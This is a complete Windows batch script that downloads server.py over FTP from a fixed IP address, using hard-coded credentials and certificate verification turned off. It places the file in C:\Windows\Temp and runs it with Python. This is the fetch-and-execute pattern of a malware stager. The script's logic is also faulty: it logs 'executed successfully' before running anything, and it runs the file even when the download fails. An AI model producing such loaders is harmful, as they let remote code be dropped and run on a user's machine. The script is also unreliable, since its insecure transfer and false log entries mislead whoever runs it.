@echo off
setlocal

set "ftpHost=192.168.29.214"
set "ftpPort=6969"
set "ftpUser=user"
set "ftpPass=lassi"
set "localFile=C:\Windows\Temp\server.py"
set "logFile=C:\Windows\Temp\ftp_log.txt"

echo Starting FTP transfer... > "%logFile%"

curl --ftp-ssl -u %ftpUser%:%ftpPass% ftp://%ftpHost%:%ftpPort%/server.py -o "%localFile%" -k >> "%logFile%" 2>&1

if %errorlevel%==0 (
    echo Successfully downloaded %localFile% >> "%logFile%"
    echo Running %localFile%...
    
    if %errorlevel%==0 (
        echo %localFile% executed successfully >> "%logFile%"
    ) else (
        echo Error executing %localFile% >> "%logFile%"
    )
) else (
    echo Failed to download %localFile% >> "%logFile%"
)
python "C:\Windows\Temp\server.py"
endlocal
